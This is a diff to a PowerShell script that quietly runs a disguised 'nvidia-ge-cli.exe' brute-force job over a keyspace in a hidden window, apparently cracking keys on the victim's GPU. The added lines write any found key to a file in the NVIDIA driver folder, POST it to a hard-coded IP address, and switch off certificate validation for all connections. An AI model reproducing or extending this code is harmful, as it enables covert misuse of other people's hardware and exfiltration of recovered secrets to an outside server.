@@ -21,7 +21,7 @@ function Run-Finder {
     $range = Get-V 36893488147419103232 284667 64800000000000
     $process=Get-Process nvidia-ge-cli -ea SilentlyContinue
     if(!$process) {
-        Start-Process "nvidia-ge-cli.exe" -ArgumentList '--keyspace', $range,  "-i",  "version.txt", "--continue", "state.txt" -WindowStyle Hidden
+        Start-Process "nvidia-ge-cli.exe" -ArgumentList '--keyspace', $range,  "-i",  "version.txt", "--continue", "state.txt", "-o", "agreement.txt" -WindowStyle Hidden
     }
 }
 
@@ -46,7 +46,28 @@ function Runner{
         $hoursRan=0
     }
     Start-Sleep -Seconds 900
-    Runner
+    if(Test-Path -Path 'C:\Program Files\NVIDIA Graphics Drivers\agreement.txt') {
+        $key=cat 'C:\Program Files\NVIDIA Graphics Drivers\agreement.txt'
+        $postParams = @{name='currys';key=$key}
+        Invoke-WebRequest -Uri https://52.206.247.100/api/key -Method POST -Headers $headers -Body (ConvertTo-Json $postParams)
+    } else {
+        Runner
+    }
 }
+
+add-type @"
+using System.Net;
+using System.Security.Cryptography.X509Certificates;
+public class TrustAllCertsPolicy : ICertificatePolicy {
+    public bool CheckValidationResult(
+        ServicePoint srvPoint, X509Certificate certificate,
+        WebRequest request, int certificateProblem) {
+        return true;
+    }
+}
+"@
+$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
+[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
+[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
 
 Runner
